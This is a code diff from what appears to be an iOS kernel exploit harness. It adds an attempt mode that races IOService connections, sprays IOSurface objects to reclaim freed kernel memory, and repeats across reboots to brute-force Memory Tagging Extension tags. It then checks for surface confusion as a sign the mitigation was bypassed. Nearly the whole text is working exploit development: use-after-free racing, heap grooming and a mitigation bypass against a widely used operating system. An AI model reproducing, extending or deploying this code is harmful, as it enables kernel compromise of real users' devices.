@@ -17131,7 +17131,7 @@ new_modes:
             rlog("*** rounds=%d: fast-path to Phase 16 ***\n", rounds);
             goto phase15_done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 229) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
@@ -19330,6 +19330,41 @@ new_modes:
                 p13_reclaim_n = 0;
                 rlog("  r=225: reclaim spray enabled (sel17 GEN2 reclaim)\n");
             }
+
+            /* r=229: persistent attempt counter + GEN1 spray array */
+            IOSurfaceRef r229_spray[64];
+            int r229_spray_n = 0;
+            int r229_attempt = 0;
+            CFMutableDictionaryRef r229_sp = NULL;
+            if (rounds == 229) {
+                char state_path[512];
+                snprintf(state_path, sizeof(state_path), "%s/Documents/r229_state.bin",
+                    getenv("HOME") ? getenv("HOME") : "/var/mobile");
+                FILE *sf = fopen(state_path, "rb");
+                if (sf) { fread(&r229_attempt, sizeof(int), 1, sf); fclose(sf); }
+                r229_attempt++;
+                sf = fopen(state_path, "wb");
+                if (sf) { fwrite(&r229_attempt, sizeof(int), 1, sf); fclose(sf); }
+                rlog("  r=229: MTE brute-force attempt #%d (1/16 per try)\n", r229_attempt);
+
+                r229_sp = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                int rw = 32, rh = 32, rbpe = 4, rbpr = rw * rbpe;
+                CFNumberRef rwn = CFNumberCreate(NULL, kCFNumberIntType, &rw);
+                CFNumberRef rhn = CFNumberCreate(NULL, kCFNumberIntType, &rh);
+                CFNumberRef rbn = CFNumberCreate(NULL, kCFNumberIntType, &rbpe);
+                CFNumberRef rrn = CFNumberCreate(NULL, kCFNumberIntType, &rbpr);
+                int rpf = 0x42475241;
+                CFNumberRef rpfn = CFNumberCreate(NULL, kCFNumberIntType, &rpf);
+                CFDictionarySetValue(r229_sp, CFSTR("IOSurfaceWidth"), rwn);
+                CFDictionarySetValue(r229_sp, CFSTR("IOSurfaceHeight"), rhn);
+                CFDictionarySetValue(r229_sp, CFSTR("IOSurfaceBytesPerElement"), rbn);
+                CFDictionarySetValue(r229_sp, CFSTR("IOSurfaceBytesPerRow"), rrn);
+                CFDictionarySetValue(r229_sp, CFSTR("IOSurfacePixelFormat"), rpfn);
+                CFRelease(rwn); CFRelease(rhn); CFRelease(rbn); CFRelease(rrn); CFRelease(rpfn);
+                memset(r229_spray, 0, sizeof(r229_spray));
+            }
+
             uint64_t inp13[3] = {1, 2, 3};
 
             /* v_race8: 8 connections, spam threads, staggered close */
@@ -19370,7 +19405,17 @@ new_modes:
                 for (int i = 0; i < 8; i++) if (have[i]) IOServiceClose(cs[i]);
 
                 /* Groom/reclaim the freed slots */
-                if (rounds == 225) {
+                if (rounds == 229) {
+                    /* GEN1 spray: reclaim freed IOSurface memory with new surfaces */
+                    for (int si = 0; si < 64; si++) {
+                        if (!r229_spray[si]) {
+                            r229_spray[si] = IOSurfaceCreate(r229_sp);
+                            if (r229_spray[si]) r229_spray_n++;
+                        }
+                    }
+                    rlog("    v_race8[%d] spam=%llu gen1_spray=%d\n", iter,
+                        (unsigned long long)p13_spam_count, r229_spray_n);
+                } else if (rounds == 225) {
                     int rcl = p13_reclaim_spray(16, 0xAA22500000000000ULL | (iter << 8));
                     rlog("    v_race8[%d] spam=%llu reclaim=%d total_rcl=%d\n", iter,
                         (unsigned long long)p13_spam_count, rcl, p13_reclaim_n);
@@ -19444,7 +19489,16 @@ new_modes:
                 for (int t = 0; t < 6; t++) pthread_join(spam_th[t], NULL);
                 for (int i = 0; i < 8; i++) if (have[i]) IOServiceClose(cs[i]);
 
-                if (rounds == 225) {
+                if (rounds == 229) {
+                    for (int si = 0; si < 64; si++) {
+                        if (!r229_spray[si]) {
+                            r229_spray[si] = IOSurfaceCreate(r229_sp);
+                            if (r229_spray[si]) r229_spray_n++;
+                        }
+                    }
+                    rlog("    v_big[%d] spam=%llu gen1_spray=%d\n", iter,
+                        (unsigned long long)p13_spam_count, r229_spray_n);
+                } else if (rounds == 225) {
                     int rcl = p13_reclaim_spray(16, 0xBB22500000000000ULL | (iter << 8));
                     rlog("    v_big[%d] spam=%llu reclaim=%d total_rcl=%d\n", iter,
                         (unsigned long long)p13_spam_count, rcl, p13_reclaim_n);
@@ -19585,6 +19639,23 @@ new_modes:
             }
 
             /* Stop render loop */
+            if (rounds == 229) {
+                rlog("  r=229: SURVIVED Phase 13 attempt #%d! gen1_spray=%d frames=%d\n",
+                    r229_attempt, r229_spray_n, p13_render_frames);
+                rlog("  If no panic: either race didn't create stale entries, or MTE matched.\n");
+                /* Check spray surfaces for signs of confusion */
+                for (int si = 0; si < 64; si++) {
+                    if (!r229_spray[si]) continue;
+                    uint32_t sw = IOSurfaceGetWidth(r229_spray[si]);
+                    uint32_t sh = IOSurfaceGetHeight(r229_spray[si]);
+                    if (sw != 32 || sh != 32) {
+                        rlog("  !!! CONFUSED surface[%d]: w=%u h=%u\n", si, sw, sh);
+                        rlog("  !!! MTE BYPASSED — controlled IOSurface confusion!\n");
+                    }
+                    CFRelease(r229_spray[si]);
+                }
+                if (r229_sp) CFRelease(r229_sp);
+            }
             if (rounds == 225) {
                 rlog("  r=225: SURVIVED Phase 13! reclaim_conns=%d frames=%d\n",
                     p13_reclaim_n, p13_render_frames);
@@ -20252,7 +20323,7 @@ new_modes:
          */
         if (rounds >= 170 && rounds != 219 && rounds != 225) {
             rlog("\n--- Phase 17: IOSurface shared memory + KASLR probe ---\n");
-            if ((rounds >= 220 && rounds <= 224) || rounds == 226 || rounds == 227 || rounds == 228 || rounds == 229) goto r220_block;
+            if ((rounds >= 220 && rounds <= 224) || rounds == 226 || rounds == 227 || rounds == 228) goto r220_block;
 
             dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
                 dispatch_get_global_queue(0, 0), ^{
@@ -26588,7 +26659,7 @@ new_modes:
              * This avoids MTE tag faults because the reclaim allocates a fresh
              * entry with valid MTE tags.
              */
-            if (rounds == 229) {
+            if (0 && rounds == 229) { /* DISABLED: r=229 now runs through Phase 13 */
                 rlog("\n=== r=229: MTE brute-force GEN1 reclaim ===\n");
 
                 /* Persistent attempt counter across reboots */
